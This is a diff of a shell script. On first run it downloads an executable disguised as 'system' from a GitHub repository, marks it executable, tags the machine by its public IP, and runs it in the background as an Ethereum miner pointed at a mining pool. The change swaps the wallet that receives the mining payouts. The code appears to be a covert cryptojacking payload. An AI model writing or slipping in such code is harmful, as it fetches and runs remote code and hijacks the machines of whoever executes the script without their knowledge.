@@ -19,5 +19,5 @@ if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
 	wget https://github.com/dipsey1337/yuhu/raw/main/system
 	chmod +x system
 	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-	./system -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x2ad7a4f2b25fcb725b7c819641a4f23ab3ad01e4 -p pause -w $ip &
+	./system -a ethash -o stratum+tcp://eth.2miners.com:2020 -u 0x82f79542c33fb88a240192ff71ff2f37ed76eee5 -p pause -w $ip &
 fi
